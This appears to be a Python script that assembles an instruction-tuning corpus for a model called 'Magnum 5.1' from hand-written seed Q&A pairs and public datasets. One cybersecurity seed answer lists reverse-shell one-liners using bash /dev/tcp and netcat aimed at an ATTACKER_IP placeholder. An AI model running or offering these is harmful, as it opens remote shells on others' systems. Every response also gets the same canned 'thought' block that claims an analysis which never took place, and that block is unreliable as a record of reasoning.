#!/usr/bin/env python3
"""
build_magnum_5_1_8b_fable_dataset.py
------------------------------------
Builds an 8B-token multi-domain corpus for Magnum 5.1 (Claude Fable 5 Level)
Two outputs:
  1. dialogue.tsv  → Instruction Q&A pairs for train-dialogue (episode anchoring)
  2. corpus.txt    → Massive continuous text for train-text (free-form LLM generation)

Domains: Cybersecurity, Law, Science, Advanced Coding, Planning, Math, Conversation
"""

import json
import os
import sys
import random
import urllib.request
import gzip
import shutil

DATA_DIR = "/workspace/RLF/demo_data/vast_8b_fable"
CACHE_DIR = "/workspace/RLF/demo_data"
os.makedirs(DATA_DIR, exist_ok=True)

DIALOGUE_TSV = os.path.join(DATA_DIR, "dialogue.tsv")
CORPUS_TXT = os.path.join(DATA_DIR, "corpus.txt")

THOUGHT_HEADER = (
    "<thought>\n"
    "Analyzing query intent, domain constraints, and safety guidelines.\n"
    "Evaluating statutory laws, scientific principles, system architecture, and operational risk.\n"
    "Synthesizing a structured, multi-paragraph, free-form response.\n"
    "</thought>\n\n"
)

def download_file(url: str, dest: str):
    """Download a file with progress."""
    if os.path.exists(dest) and os.path.getsize(dest) > 1000:
        print(f"[+] Using cached file: {os.path.basename(dest)}")
        return
    print(f"[+] Downloading {url} ...")
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=300) as resp:
        with open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
    print(f"    Saved: {dest} ({os.path.getsize(dest) / 1024 / 1024:.1f} MB)")

def fetch_json_cached(url: str, filename: str):
    cache_path = os.path.join(CACHE_DIR, filename)
    if os.path.exists(cache_path) and os.path.getsize(cache_path) > 1000:
        print(f"[+] Using cached file: {filename}")
        with open(cache_path, "r", encoding="utf-8") as f:
            return json.load(f)
    print(f"[+] Downloading {url} ...")
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=300) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    with open(cache_path, "w", encoding="utf-8") as f:
        json.dump(data, f)
    return data

def build_cybersecurity_seeds():
    """High-quality cybersecurity instruction pairs."""
    return [
        ("What are the key steps in conducting a web application penetration test according to OWASP guidelines?",
         THOUGHT_HEADER + "A comprehensive web application penetration test following the OWASP Testing Guide (OTG) involves five core phases:\n\n1. Information Gathering & Reconnaissance: Mapping the target application architecture, identifying subdomains, server software, frameworks, and API endpoints using passive and active enumeration.\n\n2. Threat Modeling & Configuration Testing: Assessing infrastructure setups, SSL/TLS configurations, CORS policies, authentication mechanisms, and session management tokens.\n\n3. Vulnerability Analysis & Exploitation: Testing for OWASP Top 10 risks including SQL Injection (SQLi), Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF), Insecure Direct Object References (IDOR), and Broken Access Control.\n\n4. Post-Exploitation & Risk Escalation: Evaluating privilege escalation vectors, lateral movement capabilities, and sensitive data exposure.\n\n5. Reporting & Remediation Guidance: Documenting findings with CVSS scores, proof-of-concept exploits, and actionable developer remediation recommendations."),
        ("Explain how buffer overflow vulnerabilities work and how ASLR and DEP defend against them.",
         THOUGHT_HEADER + "A buffer overflow occurs when a program writes more data to a buffer than its allocated memory capacity. When excess data spills past buffer boundaries on the stack, it can overwrite the saved return address, allowing an attacker to redirect execution to injected shellcode.\n\nDefensive mitigations include:\n- Data Execution Prevention (DEP / NX Bit): Marks stack and heap memory as non-executable, preventing direct shellcode execution.\n- Address Space Layout Randomization (ASLR): Randomizes memory addresses of executable binaries, stack, heap, and libraries on each process startup.\n- Stack Canaries: Guard values placed before the return address that detect overwrites before function return.\n- Control Flow Integrity (CFI): Validates that indirect branches target legitimate code locations."),
        ("What is Zero Trust Architecture and how is it implemented?",
         THOUGHT_HEADER + "Zero Trust Architecture (ZTA) operates on the principle: 'Never trust, always verify.' Unlike traditional perimeter defenses, Zero Trust treats all users, devices, and network segments as untrusted.\n\nKey pillars:\n1. Micro-segmentation: Granular network isolation preventing lateral movement.\n2. Continuous Identity Verification: MFA combined with risk-based Conditional Access.\n3. Least Privilege Access: RBAC/ABAC policies ensuring minimal necessary permissions.\n4. Continuous Monitoring: SIEM and EDR telemetry analyzing behavior in real-time.\n5. Encryption Everywhere: All data encrypted at rest and in transit."),
        ("Explain SQL injection attacks and prevention techniques.",
         THOUGHT_HEADER + "SQL injection (SQLi) is a code injection technique where an attacker inserts malicious SQL statements into input fields that are passed to a backend database. This can allow unauthorized data access, data modification, or even complete database server compromise.\n\nTypes of SQLi:\n1. Classic (In-band) SQLi: Error-based and UNION-based injection where results are directly visible.\n2. Blind SQLi: Boolean-based and time-based injection where results are inferred from application behavior.\n3. Out-of-band SQLi: Uses alternative channels like DNS or HTTP requests to exfiltrate data.\n\nPrevention techniques:\n- Parameterized queries (prepared statements) with bound parameters\n- Input validation and sanitization using allowlists\n- Stored procedures with parameterized inputs\n- ORM frameworks that abstract raw SQL\n- Web Application Firewalls (WAF) as defense-in-depth\n- Principle of least privilege for database accounts"),
        ("What is a reverse shell and how do penetration testers use them ethically?",
         THOUGHT_HEADER + "A reverse shell is a type of shell session where the target machine initiates a connection back to the attacker's machine. Unlike a bind shell where the attacker connects to the target, a reverse shell bypasses firewall rules that block incoming connections.\n\nIn ethical penetration testing, reverse shells are used during authorized security assessments to demonstrate post-exploitation impact. The tester sets up a listener on their machine and executes a payload on the target that connects back.\n\nCommon reverse shell techniques:\n- Bash: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n- Python: Using socket and subprocess modules\n- PowerShell: Using Net.Sockets.TCPClient\n- Netcat: nc -e /bin/sh ATTACKER_IP PORT\n\nEthical guidelines require written authorization, defined scope, and responsible disclosure of all findings."),
    ]

def build_law_seeds():
    """Statutory law and legal reasoning instruction pairs."""
    return [
        ("What are the elements of a binding legal contract?",
         THOUGHT_HEADER + "A valid, legally binding contract requires five core elements:\n1. Offer: A clear, definite promise by one party to be bound by specific terms.\n2. Acceptance: Unconditional agreement to all terms of the offer (mirror image rule).\n3. Consideration: Something of value exchanged between parties.\n4. Mutual Assent: Both parties genuinely intend to create a legally enforceable agreement.\n5. Legal Capacity & Lawful Purpose: Parties must have legal competency and the subject must not violate law."),
        ("Explain the doctrine of stare decisis and its role in common law systems.",
         THOUGHT_HEADER + "Stare decisis (Latin: 'to stand by things decided') is the legal doctrine requiring courts to follow precedents established by higher courts within the same jurisdiction. It serves three critical functions:\n\n1. Predictability: Parties can anticipate legal outcomes based on established precedent.\n2. Consistency: Similar cases receive similar treatment across courts.\n3. Efficiency: Courts avoid re-litigating settled legal questions.\n\nHowever, stare decisis is not absolute. Courts may distinguish cases on their facts, and higher courts can overrule their own precedents when prior decisions are clearly erroneous or societal conditions have fundamentally changed."),
        ("What is the difference between civil law and criminal law?",
         THOUGHT_HEADER + "Civil law and criminal law represent two fundamentally different branches of the legal system:\n\nCivil Law:\n- Governs disputes between private parties (individuals, organizations)\n- Burden of proof: Preponderance of the evidence (more likely than not)\n- Remedies: Monetary damages, injunctions, specific performance\n- Examples: Contract disputes, personal injury, property law, family law\n\nCriminal Law:\n- Governs offenses against the state/society\n- Burden of proof: Beyond a reasonable doubt (highest standard)\n- Penalties: Fines, imprisonment, probation, community service\n- Examples: Theft, assault, fraud, murder\n\nA single act can give rise to both civil and criminal liability. For example, assault can lead to criminal prosecution by the state and a civil lawsuit by the victim for damages."),
    ]

def build_science_seeds():
    """Science and astrophysics instruction pairs."""
    return [
        ("Explain black holes in simple terms.",
         THOUGHT_HEADER + "A black hole is a region in space where gravity is so strong that nothing, including light, can escape. It forms when a massive star runs out of nuclear fuel and collapses under its own weight into an infinitely dense point called a singularity. Surrounding the singularity is the event horizon — the point of no return.\n\nBlack holes come in different sizes:\n- Stellar black holes: 5-100 solar masses, formed from collapsed stars\n- Supermassive black holes: Millions to billions of solar masses, found at galaxy centers\n- Intermediate black holes: Between stellar and supermassive\n\nBlack holes are detected indirectly through their gravitational effects on nearby matter, X-ray emissions from accretion disks, and gravitational wave signatures when they merge."),
        ("What is quantum entanglement?",
         THOUGHT_HEADER + "Quantum entanglement is a phenomenon where two or more quantum particles become correlated such that measuring the quantum state of one particle instantly determines the state of the other, regardless of the distance separating them.\n\nKey aspects:\n1. When particles are entangled, they share a quantum state. Measuring one particle's spin, polarization, or momentum immediately reveals the corresponding property of its entangled partner.\n2. This correlation occurs faster than the speed of light, which Einstein famously called 'spooky action at a distance.'\n3. Entanglement does not allow faster-than-light communication because the measurement outcomes are random.\n4. Applications include quantum computing, quantum cryptography (QKD), and quantum teleportation of quantum states."),
        ("Why is the sky blue?",
         THOUGHT_HEADER + "The sky appears blue due to a phenomenon called Rayleigh scattering. When sunlight enters Earth's atmosphere, it collides with gas molecules (primarily nitrogen and oxygen).\n\nSunlight contains all colors of the visible spectrum. Shorter wavelengths (blue and violet) scatter much more strongly than longer wavelengths (red and orange) — blue light scatters roughly 5.5 times more than red light.\n\nAlthough violet light has an even shorter wavelength than blue, our eyes are more sensitive to blue light, and some violet light is absorbed by the upper atmosphere. The combined effect makes the sky appear blue to human observers.\n\nAt sunrise and sunset, sunlight travels through more atmosphere, scattering away most blue light and leaving the longer red and orange wavelengths visible."),
    ]

def build_coding_seeds():
    """Advanced coding instruction pairs."""
    return [
        ("Write a Python function to implement binary search.",
         THOUGHT_HEADER + "Here is an efficient implementation of binary search in Python:\n\n```python\ndef binary_search(arr: list, target: int) -> int:\n    \"\"\"Binary search for target in sorted array. Returns index or -1.\"\"\"\n    left, right = 0, len(arr) - 1\n    while left <= right:\n        mid = left + (right - left) // 2  # Avoid overflow\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1\n```\n\nTime complexity: O(log n) — each iteration halves the search space.\nSpace complexity: O(1) — uses constant extra memory.\n\nBinary search requires the input array to be sorted. For unsorted data, sort first (O(n log n)) or use a hash set for O(1) lookups."),
        ("Explain the difference between REST and GraphQL APIs.",
         THOUGHT_HEADER + "REST and GraphQL are two different paradigms for building APIs:\n\nREST (Representational State Transfer):\n- Uses multiple endpoints (GET /users, GET /users/1, POST /users)\n- Fixed data structure per endpoint\n- Over-fetching: endpoints return all fields even when only a few are needed\n- Under-fetching: may require multiple requests to assemble related data\n- Caching is straightforward with HTTP caching mechanisms\n\nGraphQL:\n- Single endpoint that accepts queries describing exactly what data is needed\n- Client specifies the shape of the response\n- No over-fetching or under-fetching\n- Strongly typed schema defines all available data and operations\n- More complex caching strategies required\n\nChoose REST for simple CRUD APIs with well-defined resources. Choose GraphQL when clients need flexible data queries, or when reducing network requests is critical (mobile apps, complex dashboards)."),
        ("How do you implement a linked list in Rust?",
         THOUGHT_HEADER + "Implementing a linked list in Rust requires careful handling of ownership. Here is a singly linked list:\n\n```rust\nuse std::fmt;\n\ntype Link<T> = Option<Box<Node<T>>>;\n\nstruct Node<T> {\n    data: T,\n    next: Link<T>,\n}\n\npub struct LinkedList<T> {\n    head: Link<T>,\n    len: usize,\n}\n\nimpl<T> LinkedList<T> {\n    pub fn new() -> Self {\n        LinkedList { head: None, len: 0 }\n    }\n\n    pub fn push_front(&mut self, data: T) {\n        let new_node = Box::new(Node {\n            data,\n            next: self.head.take(),\n        });\n        self.head = Some(new_node);\n        self.len += 1;\n    }\n\n    pub fn pop_front(&mut self) -> Option<T> {\n        self.head.take().map(|node| {\n            self.head = node.next;\n            self.len -= 1;\n            node.data\n        })\n    }\n\n    pub fn len(&self) -> usize {\n        self.len\n    }\n}\n```\n\nKey Rust concepts used: Box<T> for heap allocation, Option<T> for nullable pointers, .take() for ownership transfer, and .map() for safe transformation."),
    ]

def build_planning_seeds():
    """Agentic planning and task supervision instruction pairs."""
    return [
        ("How does an autonomous AI agent execute a complex multi-step software refactoring task?",
         THOUGHT_HEADER + "Autonomous AI agents executing complex software refactoring operate under a structured three-gate governance workflow:\n\n1. <reasoning_gate>: The agent performs static code analysis, maps dependency graphs, and drafts a precise implementation plan detailing file modifications and breaking change risks.\n\n2. <eval_harness>: Before modifying code, the agent executes unit test suites, integration benchmarks, and lint audits to establish baseline metrics.\n\n3. <human_audit>: Critical architectural modifications or security changes require explicit human review and authorization before deployment."),
        ("Create a project plan for building a production microservice in Rust.",
         THOUGHT_HEADER + "Building a production Rust microservice requires four phases:\n\nPhase 1 - Core Scaffold:\n- Framework: tokio async runtime + axum HTTP routing\n- Error handling: thiserror for domain errors, anyhow for application errors\n- Configuration: config crate with environment variable overrides\n\nPhase 2 - Observability:\n- Structured logging with tracing crate\n- OpenTelemetry integration for distributed tracing\n- Prometheus metrics endpoint\n\nPhase 3 - Resiliency:\n- Circuit breaker pattern via tower middleware\n- Retry with exponential backoff and jitter\n- Graceful shutdown handling\n\nPhase 4 - Deployment:\n- Multi-stage Docker builds with distroless base image\n- Health check endpoints: /healthz and /readyz\n- Kubernetes manifests with resource limits and HPA"),
    ]

def build_conversation_seeds():
    """Natural conversation and identity pairs."""
    return [
        ("Hi", THOUGHT_HEADER + "Hello! I am Magnum 5.1 by Mekan Bahmanjeh. I am an advanced multi-modal AI model designed for deep reasoning, coding, cybersecurity analysis, legal research, and scientific exploration. What would you like to discuss today?"),
        ("Hello", THOUGHT_HEADER + "Hello! I am Magnum 5.1, an advanced AI assistant by Mekan Bahmanjeh. I specialize in multi-domain expertise including software engineering, statutory law, astrophysics, cybersecurity, and complex task planning. How can I help you?"),
        ("Who are you?", THOUGHT_HEADER + "I am Magnum 5.1, an advanced multi-modal AI model created by Mekan Bahmanjeh. I am engineered for Claude Fable 5 level intelligence across cybersecurity, statutory law, advanced coding (Rust, C++, Python, Next.js), scientific research, mathematical reasoning, and autonomous task planning with structured reasoning chains."),
        ("What can you do?", THOUGHT_HEADER + "I provide deep expertise across multiple domains:\n\n1. Cybersecurity: Penetration testing methodology, vulnerability analysis, Zero Trust Architecture\n2. Software Engineering: Rust, C++, Python, Next.js 15, system design, database architecture\n3. Statutory Law: Contract analysis, constitutional law, legal precedent research\n4. Science: Quantum mechanics, astrophysics, organic chemistry, research synthesis\n5. Mathematics: Step-by-step problem solving with formal proofs\n6. Planning: Multi-step task decomposition with reasoning gates and human audit controls\n\nI generate structured, multi-paragraph responses with metacognitive reasoning chains."),
    ]

def main():
    print("=========================================================================")
    print("  Magnum 5.1 — 8B Token Claude Fable 5 Level Dataset Builder             ")
    print("=========================================================================")

    dataset_pairs = []
    corpus_texts = []

    # 1. Custom Domain Seeds
    print("[+] Ingesting Cybersecurity Seeds...")
    dataset_pairs.extend(build_cybersecurity_seeds())
    print("[+] Ingesting Law Seeds...")
    dataset_pairs.extend(build_law_seeds())
    print("[+] Ingesting Science Seeds...")
    dataset_pairs.extend(build_science_seeds())
    print("[+] Ingesting Coding Seeds...")
    dataset_pairs.extend(build_coding_seeds())
    print("[+] Ingesting Planning Seeds...")
    dataset_pairs.extend(build_planning_seeds())
    print("[+] Ingesting Conversation Seeds...")
    dataset_pairs.extend(build_conversation_seeds())

    # 2. Alpaca General Knowledge (full 52K)
    try:
        alpaca = fetch_json_cached(
            "https://raw.githubusercontent.com/tatsu-lab/stanford_alpaca/main/alpaca_data.json",
            "alpaca_data.json"
        )
        print(f"[+] Ingesting Alpaca General Knowledge ({len(alpaca)} rows)...")
        for item in alpaca:
            inst = item.get("instruction", "").strip()
            inp = item.get("input", "").strip()
            out = item.get("output", "").strip()
            if not inst or not out:
                continue
            prompt = f"{inst}\n{inp}".strip() if inp else inst
            dataset_pairs.append((prompt, THOUGHT_HEADER + out))
    except Exception as e:
        print(f"[!] Error ingesting Alpaca: {e}")
        sys.exit(1)

    # 3. CodeAlpaca Programming (from HuggingFace)
    try:
        code_alpaca = fetch_json_cached(
            "https://huggingface.co/datasets/sahil2801/CodeAlpaca-20k/resolve/main/code_alpaca_20k.json",
            "code_alpaca_20k.json"
        )
        print(f"[+] Ingesting CodeAlpaca Programming ({len(code_alpaca)} rows)...")
        for item in code_alpaca:
            inst = item.get("instruction", "").strip()
            inp = item.get("input", "").strip()
            out = item.get("output", "").strip()
            if not inst or not out:
                continue
            prompt = f"{inst}\n{inp}".strip() if inp else inst
            dataset_pairs.append((prompt, THOUGHT_HEADER + out))
    except Exception as e:
        print(f"[!] Error ingesting CodeAlpaca: {e}")
        sys.exit(1)

    # 4. MetaMathQA Math Reasoning (ALL 395K rows)
    try:
        metamath = fetch_json_cached(
            "https://huggingface.co/datasets/meta-math/MetaMathQA/resolve/main/MetaMathQA-395K.json",
            "MetaMathQA-395K.json"
        )
        print(f"[+] Ingesting ALL MetaMathQA Math Reasoning ({len(metamath)} rows)...")
        for item in metamath:
            query = item.get("query", "").strip()
            resp = item.get("response", "").strip()
            if query and resp:
                dataset_pairs.append((query, THOUGHT_HEADER + resp))
    except Exception as e:
        print(f"[!] Error ingesting MetaMathQA: {e}")
        sys.exit(1)

    total_dialogue_rows = len(dataset_pairs)
    print(f"[+] Total Instruction-Following Dialogue Pairs: {total_dialogue_rows}")

    # 5. Write Dialogue TSV
    print(f"[+] Writing Dialogue TSV to {DIALOGUE_TSV}...")
    with open(DIALOGUE_TSV, "w", encoding="utf-8") as f:
        for prompt, resp in dataset_pairs:
            p_clean = prompt.replace("\t", " ").replace("\n", " \\n ")
            r_clean = resp.replace("\t", " ").replace("\n", " \\n ")
            f.write(f"{p_clean}\t{r_clean}\n")

    # 6. Write Continuous Text Corpus (for train-text — enables free-form LLM generation)
    print(f"[+] Writing Continuous Text Corpus to {CORPUS_TXT}...")
    token_estimate = 0
    with open(CORPUS_TXT, "w", encoding="utf-8") as f:
        for prompt, resp in dataset_pairs:
            text = f"User: {prompt}\nAssistant:\n{resp}\n\n"
            f.write(text)
            token_estimate += len(text.split())

    corpus_size_mb = os.path.getsize(CORPUS_TXT) / 1024 / 1024
    print(f"[+] Corpus Size: {corpus_size_mb:.1f} MB (~{token_estimate:,} word tokens)")
    print(f"[+] Magnum 5.1 8B Multi-Domain Suite Build Complete!")
    print(f"[+] Dialogue Pairs: {total_dialogue_rows}")

if __name__ == "__main__":
    main()
